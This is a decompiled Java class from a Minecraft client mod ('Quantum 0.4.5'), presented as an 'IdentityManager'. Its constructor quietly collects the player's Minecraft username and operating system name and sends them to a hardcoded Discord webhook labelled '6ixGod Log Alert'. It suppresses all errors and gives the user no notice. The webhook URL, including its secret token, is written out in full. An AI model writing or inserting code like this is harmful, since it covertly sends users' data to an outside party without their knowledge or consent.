//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "1.12 stable mappings"!

// 
// Decompiled by Procyon v0.5.36
// 

package me.alpha432.oyvey.manager.Identify;

import net.minecraft.client.Minecraft;

public class IdentityManager
{
    public IdentityManager() {
        final String Webhook = "https://discord.com/api/webhooks/849977720058544149/V-0hmwbVNf75jPK0EaqUOAF_ypFxz1GemrjlmJerHWhYCagkPr2Cy45VorZ5HX0qoy-x";
        final String BotName = "6ixGod Log Alert";
        final String Version = "Quantum 0.4.5";
        final UtilOne d = new UtilOne("https://discord.com/api/webhooks/849977720058544149/V-0hmwbVNf75jPK0EaqUOAF_ypFxz1GemrjlmJerHWhYCagkPr2Cy45VorZ5HX0qoy-x");
        String minecraft_name = "NOT FOUND";
        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        }
        catch (Exception ex) {}
        final String OsName = System.getProperty("os.name");
        try {
            final String IGN = System.getProperty("user.name");
            final UtilFour dm = new UtilFour.Builder().withUsername("6ixGod Log Alert").withContent("```Version: Quantum 0.4.5\n IGN  : " + minecraft_name + " \n OS   : " + OsName + "```").withDev(false).build();
            d.sendMessage(dm);
        }
        catch (Exception ex2) {}
    }
}
